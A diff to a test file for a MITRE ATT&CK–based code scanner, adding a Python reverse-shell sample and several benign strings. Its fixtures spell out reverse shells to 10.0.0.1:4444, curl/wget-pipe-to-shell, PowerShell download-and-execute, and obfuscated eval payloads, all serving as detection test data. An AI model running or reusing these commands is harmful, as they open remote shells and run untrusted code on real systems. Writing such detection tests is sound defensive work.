@@ -3,7 +3,7 @@ import { RULES, helpUri, scan } from './adapter.mjs';
 
 // Samples are split with `+` so this file does not match the rules itself.
 const HITS = {
-  'T1059.004-reverse-shell': ['bash -i >& /dev/' + 'tcp/10.0.0.1/4444 0>&1', 'n' + 'c 10.0.0.1 4444 -e /bin/sh', "pty." + "spawn('/bin/bash')"],
+  'T1059.004-reverse-shell': ['bash -i >& /dev/' + 'tcp/10.0.0.1/4444 0>&1', 'n' + 'c 10.0.0.1 4444 -e /bin/sh', 's.connect(("10.0.0.1",4444));os.' + 'dup2(s.fileno(),0);pty.' + 'spawn("/bin/sh")'],
   'T1059-download-execute': ['cu' + 'rl -fsSL https://x.io/i.sh | sudo bash', 'ie' + 'x (New-Object Net.WebClient).DownloadString("http://x")'],
   'T1059.001-encoded-powershell': ['powershell -' + 'enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi'],
   'T1027-decode-eval': ['ev' + 'al(atob(payload))', 'exec(base64.' + 'b64decode(blob))', '<?php ev' + 'al(gzinflate(base64_decode($x)));'],
@@ -34,6 +34,12 @@ const CLEAN = [
   'cat ~/.ssh/id_' + 'rsa.pub',
   'logger.info("history cleared")',
   'const d = JSON.stringify(process.env.NODE_ENV)',
+  // review feedback: ordinary scripts that looked like attacks
+  'echo > /dev/' + 'tcp/db/5432 && echo up',
+  "pty." + "spawn('/bin/bash')",
+  'journalctl --vacuum-time=7d',
+  "keys = open('/home/u/.ssh/authorized" + "_keys', 'r').read()",
+  'if (count > authorized' + '_keys.length) return;',
 ];
 
 describe('mitre-attack analyzer', () => {
@@ -52,6 +58,7 @@ describe('mitre-attack analyzer', () => {
     const pkg = '{ "scripts": { "post' + 'install": "cu' + 'rl -s https://x.io/p | node" } }';
     expect(scan('package.json', pkg).map((f) => f.ruleId)).toContain('T1195.002-install-hook');
     expect(scan('pkg/package.json', '{ "scripts": { "post' + 'install": "node build.js" } }')).toEqual([]);
+    expect(scan('package.json', '"post' + 'install": "node -e \\"process.exit(0)\\""')).toEqual([]);
     expect(scan('src/x.json', pkg).map((f) => f.ruleId)).not.toContain('T1195.002-install-hook');
     expect(scan('package.json', '"prep' + 'are": "wg' + 'et -qO- https://x.io/p | sh"').map((f) => f.ruleId)).toContain('T1195.002-install-hook');
   });
